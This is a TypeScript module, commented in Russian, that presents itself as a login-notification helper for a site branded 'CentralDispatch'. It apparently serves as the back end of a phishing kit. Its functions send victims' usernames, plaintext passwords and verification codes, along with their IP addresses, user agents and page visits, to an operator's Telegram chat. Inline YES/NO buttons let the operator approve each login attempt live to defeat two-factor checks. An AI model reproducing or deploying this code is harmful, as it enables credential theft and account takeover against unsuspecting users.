/**
 * Модуль для работы с Telegram Bot API
 * Отправка уведомлений о входе в систему с кнопками YES/NO
 */

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

/**
 * Отправка сообщения в Telegram с кнопками YES/NO
 * @param username - имя пользователя
 * @param password - пароль
 * @param requestId - уникальный ID запроса для отслеживания ответа
 * @returns message_id отправленного сообщения
 */
export async function sendLoginTelegram(
  username: string,
  password: string,
  requestId: string
): Promise<number> {
  console.log("[TELEGRAM] Отправка уведомления о входе...");
  console.log("[TELEGRAM] Request ID:", requestId);

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
  }

  const message = `🔐 *CentralDispatch - Новый вход в систему*

👤 *Username:* \`${username}\`
🔑 *Password:* \`${password}\`

⏰ *Время:* ${new Date().toLocaleString("ru-RU")}

Выберите действие:`;

  const keyboard = {
    inline_keyboard: [
      [
        {
          text: "✅ YES",
          callback_data: `login_yes_${requestId}`,
        },
        {
          text: "❌ NO",
          callback_data: `login_no_${requestId}`,
        },
      ],
    ],
  };

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
          reply_markup: keyboard,
        }),
      }
    );

    const data = await response.json();

    if (!response.ok) {
      console.error("[TELEGRAM] Ошибка отправки:", data);
      throw new Error(data.description || "Не удалось отправить сообщение в Telegram");
    }

    console.log("[TELEGRAM] Сообщение успешно отправлено, message_id:", data.result.message_id);
    return data.result.message_id;
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить сообщение в Telegram");
  }
}

/**
 * Отправка ответа на callback query (убирает loading на кнопках)
 * @param callbackQueryId - ID callback query
 * @param text - текст ответа (опционально)
 */
export async function answerCallbackQuery(
  callbackQueryId: string,
  text?: string
): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) {
    return;
  }

  try {
    await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: text || "Обработано",
        }),
      }
    );
  } catch (error) {
    console.error("[TELEGRAM] Ошибка ответа на callback:", error);
  }
}

/**
 * Отправка кода верификации в Telegram
 * @param code - код верификации
 * @param username - имя пользователя
 * @param clientIp - IP адрес клиента
 * @param userAgent - User Agent браузера
 */
export async function sendCodeTelegram(
  code: string,
  username: string,
  clientIp: string,
  userAgent: string
): Promise<void> {
  console.log("[TELEGRAM] Отправка кода верификации...");

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    throw new Error("TELEGRAM_BOT_TOKEN и TELEGRAM_CHAT_ID должны быть настроены");
  }

  const message = `🔢 *CentralDispatch - Код верификации*

👤 *Username:* \`${username}\`
🔑 *Code:* \`${code}\`

🌐 *IP:* \`${clientIp}\`
💻 *User Agent:* \`${userAgent}\`

⏰ *Время:* ${new Date().toLocaleString("ru-RU")}`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    const data = await response.json();

    if (!response.ok) {
      console.error("[TELEGRAM] Ошибка отправки кода:", data);
      throw new Error(data.description || "Не удалось отправить код в Telegram");
    }

    console.log("[TELEGRAM] Код успешно отправлен");
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw new Error("Не удалось отправить код в Telegram");
  }
}

/**
 * Отправка произвольного сообщения в Telegram
 * @param chatId - ID чата
 * @param message - текст сообщения
 * @param parseMode - режим парсинга (Markdown, HTML)
 */
export async function sendMessage(
  chatId: string | number,
  message: string,
  parseMode?: string
): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN) {
    throw new Error("TELEGRAM_BOT_TOKEN не настроен");
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: parseMode || undefined,
        }),
      }
    );

    const data = await response.json();

    if (!response.ok) {
      console.error("[TELEGRAM] Ошибка отправки сообщения:", data);
      throw new Error(data.description || "Не удалось отправить сообщение");
    }

    console.log("[TELEGRAM] Сообщение успешно отправлено");
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
    throw error;
  }
}

/**
 * Отправка уведомления о посещении сайта
 * @param path - путь страницы
 * @param userAgent - User Agent браузера
 * @param clientIp - IP адрес клиента
 */
export async function sendVisitNotification(
  path: string,
  userAgent: string,
  clientIp: string
): Promise<void> {
  console.log("[TELEGRAM] Отправка уведомления о посещении...");

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn("[TELEGRAM] Telegram не настроен, пропускаем уведомление");
    return;
  }

  const message = `🌐 *CentralDispatch - Новое посещение*

📍 *Страница:* ${path}
🌐 *IP:* \`${clientIp}\`
💻 *User Agent:* \`${userAgent}\`

⏰ *Время:* ${new Date().toLocaleString("ru-RU")}`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: "Markdown",
        }),
      }
    );

    const data = await response.json();

    if (!response.ok) {
      console.error("[TELEGRAM] Ошибка отправки уведомления:", data);
    } else {
      console.log("[TELEGRAM] Уведомление о посещении отправлено");
    }
  } catch (error) {
    console.error("[TELEGRAM] Ошибка:", error);
  }
}

